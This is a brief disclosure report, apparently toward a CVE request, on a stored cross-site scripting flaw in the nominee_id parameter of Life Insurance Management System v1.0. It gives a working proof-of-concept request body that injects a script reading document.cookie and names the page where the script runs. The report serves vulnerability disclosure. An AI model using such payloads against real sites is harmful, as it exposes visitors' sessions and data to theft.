# Life Insurance Management System v1.0 has stored cross-site scripting

BUG_Author: wengao

Website source code address: https://www.sourcecodester.com/php/14665/life-insurance-management-system-php-full-source-code.html

Vulnerability File: /lims/insertNominee.php

POST parameter "nominee_id" exists stored cross-site scripting vulnerability

Payload: nominee_id=<script>alert(document.cookie)</script>&client_id=2&name=3&sex=4&birth_date=5&nid=6&relationship=7&priority=8&phone=9

![image](https://github.com/Hanwengao/CVERequests/blob/main/1.png)

Payload will trigger when a user visits on http://localhost/lims/nominee.php

![image](https://github.com/Hanwengao/CVERequests/blob/main/2.png)

